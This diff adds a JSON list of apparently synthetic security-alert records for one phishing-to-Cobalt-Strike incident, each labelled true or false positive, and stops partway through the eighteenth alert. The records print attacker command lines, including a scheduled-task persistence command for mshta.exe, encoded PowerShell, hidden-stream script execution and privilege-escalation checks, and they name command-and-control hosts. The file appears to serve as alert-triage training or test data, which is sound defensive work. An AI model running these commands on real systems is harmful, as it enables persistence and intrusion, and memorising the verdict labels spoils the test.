@@ -1,0 +1,2479 @@
+[
+  {
+    "alert_id": "alert-20260705-0001",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T08:11:28Z",
+    "ingested_at": "2026-07-05T08:16:28Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "email",
+        "malware"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Email: Malicious Attachment Detected",
+      "description": "Email with CV.doc attachment bypassing initial filters.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1566.001"
+      ]
+    },
+    "alert": {
+      "title": "Email: Malicious Attachment Detected",
+      "summary": "Email with CV.doc attachment bypassing initial filters.",
+      "status": "new",
+      "confidence": 0.85,
+      "risk_score": 75,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "gw-mail01",
+      "type": "gateway"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0001",
+      "host_risk": 76,
+      "user_risk": 44,
+      "asset_criticality": "Medium",
+      "attack_stage": "initial-access",
+      "kill_chain_phase": "Delivery"
+    },
+    "target": {
+      "hostname": "DESKTOP-JD"
+    },
+    "network": {
+      "src_ip": "104.237.218.72",
+      "dst_ip": "10.10.2.55",
+      "dst_port": 25
+    },
+    "threat": {
+      "technique": {
+        "id": "T1566.001",
+        "name": "Spearphishing Attachment"
+      }
+    },
+    "evidence": [
+      {
+        "type": "email_attachment",
+        "data": {
+          "file_name": "CV.doc"
+        }
+      }
+    ],
+    "knowledge_base": "Email: Malicious Attachment Detected - Analyze the associated files or emails for malicious characteristics."
+  },
+  {
+    "alert_id": "alert-20260705-0002",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T08:16:33Z",
+    "ingested_at": "2026-07-05T08:21:33Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "discovery"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: Potential Port Scan Detected",
+      "description": "High volume of connections across multiple ports from internal IP.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Network: Potential Port Scan Detected",
+      "summary": "High volume of connections across multiple ports from internal IP.",
+      "status": "new",
+      "confidence": 0.6,
+      "risk_score": 40,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-INTERNAL",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0002",
+      "host_risk": 64,
+      "user_risk": 72,
+      "asset_criticality": "Medium"
+    },
+    "network": {
+      "src_ip": "10.10.5.100",
+      "dst_ip": "10.10.2.55",
+      "dst_port": 445
+    },
+    "knowledge_base": "Authorized scan, verified with IT team."
+  },
+  {
+    "alert_id": "alert-20260705-0003",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T08:24:15Z",
+    "ingested_at": "2026-07-05T08:29:15Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "persistence"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Process: Suspicious Scheduled Task Creation",
+      "description": "Word document macro creating scheduled task for mshta.exe.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1053.005"
+      ]
+    },
+    "alert": {
+      "title": "Process: Suspicious Scheduled Task Creation",
+      "summary": "Word document macro creating scheduled task for mshta.exe.",
+      "status": "new",
+      "confidence": 0.9,
+      "risk_score": 90,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "schtasks.exe",
+        "command_line": "schtasks /create /sc MINUTE /tn \"Windows Error Reporting\" /tr \"mshta.exe about:\" /mo 15 /F"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0003",
+      "host_risk": 37,
+      "user_risk": 81,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1053.005",
+        "name": "Scheduled Task/Job: Scheduled Task"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process_name": "schtasks.exe"
+        }
+      }
+    ],
+    "additional_context": "schtasks used to execute mshta.exe every 15 minutes.",
+    "knowledge_base": "Process: Suspicious Scheduled Task Creation - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0004",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T08:25:47Z",
+    "ingested_at": "2026-07-05T08:30:47Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Process: Remote PowerShell Execution",
+      "description": "PowerShell remoting used by Administrator account.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Process: Remote PowerShell Execution",
+      "summary": "PowerShell remoting used by Administrator account.",
+      "status": "new",
+      "confidence": 0.7,
+      "risk_score": 45,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-WEB01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "admin_jsmith"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell -NoProfile -ExecutionPolicy Bypass -Command Enter-PSSession -ComputerName SRV-WEB01"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0004",
+      "host_risk": 79,
+      "user_risk": 90,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Legitimate IT administration activity, verified with IT team."
+  },
+  {
+    "alert_id": "alert-20260705-0005",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T08:40:39Z",
+    "ingested_at": "2026-07-05T08:45:39Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: Suspicious mshta network connection",
+      "description": "mshta.exe communicating with external server.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1105"
+      ]
+    },
+    "alert": {
+      "title": "Network: Suspicious mshta network connection",
+      "summary": "mshta.exe communicating with external server.",
+      "status": "new",
+      "confidence": 0.88,
+      "risk_score": 80,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "mshta.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0005",
+      "host_risk": 34,
+      "user_risk": 55,
+      "asset_criticality": "Medium",
+      "attack_stage": "execution",
+      "kill_chain_phase": "Command and Control"
+    },
+    "target": {
+      "ip": "23.227.196.210"
+    },
+    "network": {
+      "src_ip": "10.10.2.55",
+      "dst_ip": "23.227.196.210",
+      "dst_port": 80,
+      "dst_hostname": "support.chatconnecting.com"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "23.227.196.210"
+        }
+      }
+    ],
+    "additional_context": "mshta.exe downloading payload from support.chatconnecting.com.",
+    "knowledge_base": "Network: Suspicious mshta network connection"
+  },
+  {
+    "alert_id": "alert-20260705-0006",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T08:47:27Z",
+    "ingested_at": "2026-07-05T08:52:27Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: Large Outbound Data Transfer",
+      "description": "Large volume of data sent to external IP.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Network: Large Outbound Data Transfer",
+      "summary": "Large volume of data sent to external IP.",
+      "status": "new",
+      "confidence": 0.5,
+      "risk_score": 30,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "OneDrive.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0006",
+      "host_risk": 36,
+      "user_risk": 63,
+      "asset_criticality": "Medium"
+    },
+    "network": {
+      "src_ip": "10.10.2.55",
+      "dst_ip": "13.107.136.9",
+      "dst_port": 443,
+      "dst_hostname": "onedrive.live.com"
+    },
+    "knowledge_base": "Authorized data transfer/sync process, verified with IT team."
+  },
+  {
+    "alert_id": "alert-20260705-0007",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:01:13Z",
+    "ingested_at": "2026-07-05T09:06:13Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "execution"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: Obfuscated PowerShell",
+      "description": "PowerShell executing obfuscated command.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1059.001"
+      ]
+    },
+    "alert": {
+      "title": "Execution: Obfuscated PowerShell",
+      "summary": "PowerShell executing obfuscated command.",
+      "status": "new",
+      "confidence": 0.95,
+      "risk_score": 95,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell -nop -exec bypass -EncodedCommand ..."
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0007",
+      "host_risk": 22,
+      "user_risk": 80,
+      "asset_criticality": "Medium",
+      "attack_stage": "execution",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "file_hash": "C845F3AF0A2B7E034CE43658276AF3B3E402EB7B"
+        }
+      }
+    ],
+    "additional_context": "Command line truncated due to logging limits. Invoke-obfuscation patterns detected in payload microsoft.jpg.",
+    "knowledge_base": "Execution: Obfuscated PowerShell"
+  },
+  {
+    "alert_id": "alert-20260705-0008",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:11:56Z",
+    "ingested_at": "2026-07-05T09:16:56Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "defense_evasion"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Defense Evasion: Cobalt Strike Detected",
+      "description": "In-memory detection of Cobalt Strike beacon.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1055"
+      ]
+    },
+    "alert": {
+      "title": "Defense Evasion: Cobalt Strike Detected",
+      "summary": "In-memory detection of Cobalt Strike beacon.",
+      "status": "new",
+      "confidence": 0.98,
+      "risk_score": 100,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0008",
+      "host_risk": 25,
+      "user_risk": 28,
+      "asset_criticality": "Medium",
+      "attack_stage": "defense-evasion",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1055",
+        "name": "Process Injection"
+      }
+    },
+    "evidence": [
+      {
+        "type": "memory_scan",
+        "data": {
+          "pattern": "Cobalt Strike"
+        }
+      }
+    ],
+    "knowledge_base": "Defense Evasion: Cobalt Strike Detected - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0009",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:20:02Z",
+    "ingested_at": "2026-07-05T09:25:02Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: Unsigned PowerShell Script",
+      "description": "Execution of an unsigned local script.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Execution: Unsigned PowerShell Script",
+      "summary": "Execution of an unsigned local script.",
+      "status": "new",
+      "confidence": 0.4,
+      "risk_score": 20,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-DEV1",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "dsmith"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell ./build_artifacts.ps1"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0009",
+      "host_risk": 57,
+      "user_risk": 71,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Legitimate IT administration activity, verified with IT team."
+  },
+  {
+    "alert_id": "alert-20260705-0010",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:22:26Z",
+    "ingested_at": "2026-07-05T09:27:26Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "persistence",
+        "registry"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Persistence: Suspicious Registry Run Key",
+      "description": "VBScript added to registry run key.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1547.001"
+      ]
+    },
+    "alert": {
+      "title": "Persistence: Suspicious Registry Run Key",
+      "summary": "VBScript added to registry run key.",
+      "status": "new",
+      "confidence": 0.85,
+      "risk_score": 80,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "wscript.exe"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0010",
+      "host_risk": 76,
+      "user_risk": 57,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1547.001",
+        "name": "Registry Run Keys"
+      }
+    },
+    "evidence": [
+      {
+        "type": "registry_event",
+        "data": {
+          "key": "Java Update Schedule Check"
+        }
+      }
+    ],
+    "knowledge_base": "Persistence: Suspicious Registry Run Key - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0011",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:35:57Z",
+    "ingested_at": "2026-07-05T09:40:57Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Authentication: Multiple Failed Logons",
+      "description": "User experienced 5 failed logon attempts within 2 minutes.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Authentication: Multiple Failed Logons",
+      "summary": "User experienced 5 failed logon attempts within 2 minutes.",
+      "status": "new",
+      "confidence": 0.6,
+      "risk_score": 35,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "DC-01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "mrobinson"
+      },
+      "process": {
+        "name": "lsass.exe"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0011",
+      "host_risk": 81,
+      "user_risk": 87,
+      "asset_criticality": "High"
+    },
+    "target": {
+      "hostname": "DC-01"
+    },
+    "network": {
+      "src_ip": "10.10.4.15",
+      "dst_ip": "10.10.1.10",
+      "dst_port": 389
+    },
+    "knowledge_base": "Expected user activity, verified with the user."
+  },
+  {
+    "alert_id": "alert-20260705-0012",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:42:27Z",
+    "ingested_at": "2026-07-05T09:47:27Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "defense_evasion",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Defense Evasion: Execution from ADS",
+      "description": "PowerShell executing payload hidden in NTFS Alternate Data Stream.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1564.004"
+      ]
+    },
+    "alert": {
+      "title": "Defense Evasion: Execution from ADS",
+      "summary": "PowerShell executing payload hidden in NTFS Alternate Data Stream.",
+      "status": "new",
+      "confidence": 0.92,
+      "risk_score": 90,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "Invoke-Expression C:\\ProgramData\\Microsoft\\SndVolSSO.ps1"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0012",
+      "host_risk": 25,
+      "user_risk": 81,
+      "asset_criticality": "Medium",
+      "attack_stage": "defense-evasion",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1564.004",
+        "name": "Hide Artifacts: NTFS File Attributes"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "command": "Invoke-Expression"
+        }
+      }
+    ],
+    "additional_context": "Execution of SndVolSSO.ps1 from hidden ADS.",
+    "knowledge_base": "Defense Evasion: Execution from ADS - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0013",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:48:20Z",
+    "ingested_at": "2026-07-05T09:53:20Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Command and Control: DNS Tunneling",
+      "description": "High volume of DNS queries to z.teriava.com.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.004"
+      ]
+    },
+    "alert": {
+      "title": "Command and Control: DNS Tunneling",
+      "summary": "High volume of DNS queries to z.teriava.com.",
+      "status": "new",
+      "confidence": 0.89,
+      "risk_score": 85,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "arp.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0013",
+      "host_risk": 72,
+      "user_risk": 32,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "network": {
+      "src_ip": "10.10.2.55",
+      "dst_ip": "8.8.8.8",
+      "dst_port": 53,
+      "dst_hostname": "z.teriava.com"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS"
+      }
+    },
+    "evidence": [
+      {
+        "type": "dns_query",
+        "data": {
+          "query": "z.teriava.com"
+        }
+      }
+    ],
+    "additional_context": "DNS tunneling to z.teriava.com via Google DNS.",
+    "knowledge_base": "Command and Control: DNS Tunneling"
+  },
+  {
+    "alert_id": "alert-20260705-0014",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:50:49Z",
+    "ingested_at": "2026-07-05T09:55:49Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "discovery",
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Discovery: Internal Network Scanning",
+      "description": "Port scanning activity detected.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1046"
+      ]
+    },
+    "alert": {
+      "title": "Discovery: Internal Network Scanning",
+      "summary": "Port scanning activity detected.",
+      "status": "new",
+      "confidence": 0.8,
+      "risk_score": 75,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-INTERNAL",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "Scan 192.168.8.0-254 -os -scanport"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0014",
+      "host_risk": 73,
+      "user_risk": 45,
+      "asset_criticality": "Medium",
+      "attack_stage": "discovery",
+      "kill_chain_phase": "Reconnaissance"
+    },
+    "network": {
+      "src_ip": "10.10.2.55",
+      "dst_ip": "192.168.8.15",
+      "dst_port": 445
+    },
+    "threat": {
+      "technique": {
+        "id": "T1046",
+        "name": "Network Service Scanning"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_port": "445"
+        }
+      }
+    ],
+    "knowledge_base": "Discovery: Internal Network Scanning - Verify the network connection with the N/W engineer."
+  },
+  {
+    "alert_id": "alert-20260705-0015",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T09:56:48Z",
+    "ingested_at": "2026-07-05T10:01:48Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: Unusual SMB Traffic Volume",
+      "description": "High volume of SMB traffic detected from endpoint.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Network: Unusual SMB Traffic Volume",
+      "summary": "High volume of SMB traffic detected from endpoint.",
+      "status": "new",
+      "confidence": 0.5,
+      "risk_score": 25,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-INTERNAL",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      },
+      "process": {
+        "name": "sqlservr.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0015",
+      "host_risk": 79,
+      "user_risk": 44,
+      "asset_criticality": "Medium"
+    },
+    "network": {
+      "src_ip": "10.10.1.50",
+      "dst_ip": "10.10.1.200",
+      "dst_port": 445,
+      "dst_hostname": "BACKUP-NAS-01"
+    },
+    "knowledge_base": "Legitimate activity, verified with the relevant team."
+  },
+  {
+    "alert_id": "alert-20260705-0016",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T10:06:09Z",
+    "ingested_at": "2026-07-05T10:11:09Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "discovery",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Discovery: System Information Gathering",
+      "description": "Multiple system discovery commands run.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1082"
+      ]
+    },
+    "alert": {
+      "title": "Discovery: System Information Gathering",
+      "summary": "Multiple system discovery commands run.",
+      "status": "new",
+      "confidence": 0.75,
+      "risk_score": 60,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c ipconfig & netstat -an & arp -a"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0016",
+      "host_risk": 63,
+      "user_risk": 84,
+      "asset_criticality": "Medium",
+      "attack_stage": "discovery",
+      "kill_chain_phase": "Reconnaissance"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1082",
+        "name": "System Information Discovery"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process": "ipconfig.exe"
+        }
+      }
+    ],
+    "knowledge_base": "Discovery: System Information Gathering - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0017",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T10:17:49Z",
+    "ingested_at": "2026-07-05T10:22:49Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "privilege_escalation",
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Privilege Escalation: PowerUp Execution",
+      "description": "Execution of Invoke-AllChecks.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1068"
+      ]
+    },
+    "alert": {
+      "title": "Privilege Escalation: PowerUp Execution",
+      "summary": "Execution of Invoke-AllChecks.",
+      "status": "new",
+      "confidence": 0.95,
+      "risk_score": 95,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-JD",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jdoe"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "Invoke-AllChecks"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-1300",
+      "correlation_id": "corr-0017",
+      "host_risk": 90,
+      "user_risk": 65,
+      "asset_criticality": "Medium",
+      "attack_stage": "privilege-escalation",
+      "kill_chain_phase": "Exploitation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1068",
+        "name": "Exploitation for Privilege Escalation"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "command": "Invoke-AllChecks"
+        }
+      }
+    ],
+    "knowledge_base": "Privilege Escalation: PowerUp Execution - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260705-0018",
+    "schema_version": "1.0",
+    "timestamp": "2026-07-05T10:32:09Z",
+    "ingested_at": "2026-07-05T10:37:09Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
